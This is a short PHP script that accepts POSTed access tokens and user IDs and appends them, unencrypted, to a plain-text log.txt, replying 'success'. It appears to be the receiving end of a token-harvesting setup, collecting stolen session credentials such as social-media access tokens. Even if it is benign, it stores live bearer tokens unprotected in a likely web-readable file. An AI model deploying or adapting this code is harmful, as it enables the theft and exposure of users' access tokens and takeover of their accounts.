<?php
if($_POST && !empty($_POST['accessToken'])  && !empty($_POST['userID']))
{
 $accessToken = $_POST['accessToken'] ? (string) $_POST['accessToken'] : null;  
 $userID = $_POST['userID'] ? (int) $_POST['userID'] : null;  
 $fp = fopen("log.txt", "a+");
 fwrite($fp, $userID."|".$accessToken."\n");
 fclose($fp);
 exit('success');
}
else
{
 exit('error');
}
?>